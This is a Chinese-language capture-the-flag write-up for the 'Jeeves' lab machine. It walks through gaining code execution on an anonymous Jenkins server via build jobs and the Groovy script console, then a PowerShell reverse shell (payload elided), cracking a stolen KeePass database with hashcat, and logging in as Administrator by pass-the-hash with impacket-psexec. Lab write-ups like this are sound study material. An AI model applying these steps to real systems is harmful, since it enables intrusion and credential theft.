---
title: Jeeves
description: 
tags:
  - Jenkins
  - KeePass
  - PSExec
  - ADS
date: 2026-07-09
---

## Initial Access

基本起手式，發現 port 50000。

```bash
mozix@Jeeves$ sudo nmap -p- -Pn -v 10.129.2.46       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 10:30 CST
Nmap scan report for 10.129.2.46
Host is up (0.10s latency).    
Not shown: 65531 filtered ports
PORT      STATE SERVICE
80/tcp    open  http 
135/tcp   open  msrpc       
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 199.37 seconds
           Raw packets sent: 131212 (5.773MB) | Rcvd: 60549 (10.168MB)
```

### 方法一：build job

接著 feroxbuster 掃描 port 50000，發現 `/askjeeves` 路徑，是 Jenkins，版本 2.87，可以匿名存取。
隨後建立 job（New Item），並在 Build 選擇 「Execute Windows batch command」，輸入 `cmd /c whoami` 並儲存。
返回 Jenkins 主頁，點選 build now，build history 會顯示目前 build 的狀態，點選進入後，Console Output 可以發現帳號為 `jeeves\kohsuke`。

### 方法二：Script Console

在 script console 中輸入 `println 'cmd.exe /c whoami'.execute().text`，也可以在 Result 看到 `jeeves\kohsuke`。

## Shell

方法一：同樣建立一個新 job，直接輸入 reverse shell 的 powershell command （`powershell -e ...`）。
方法二：在 script console 中輸入 `println 'powershell -e ...'.execute()`，也可以。

## Lateral movement

在 kohsuke Document 底下發現 CEH.kdbx，直接無情幹下來，不過為了省下回傳檔案的功夫，我們可以直接把 CEH.kdbx 放到 Administrator\.jenkins\workspace\TMP 中，然後直接從 Jenkins 上點擊並下載。
接下來就是破密的歡樂時光：

```bash
keepass2john CEH.kdbx > CEH.hash
hashcat -m 13400 CEH.hash -a 0 -o CEH.txt /usr/share/wordlists/rockyou.txt
kpcli --kdb CEH.kdbx --pw-stdin < '密碼'
```

keepass 指令

```bash
# 確認有哪些帳號
find .
# 看帳號密碼
show -f 0
show -f 1
...
```

以上取得的密碼可以存到一個 pass 檔案中，以利 nxc 掃描測試，最後發現是 NTLM hash 可以登入。

```bash
impacket-psexec -hashes 'NTLM hash' jeeves/Administrator@10.129.2.46
```

最後，他的 root flag 被隱藏在檔案流中，需使用 `more < hm.txt:root.txt` 來讀取。

```bash
dir /R
more < hm.txt:root.txt
```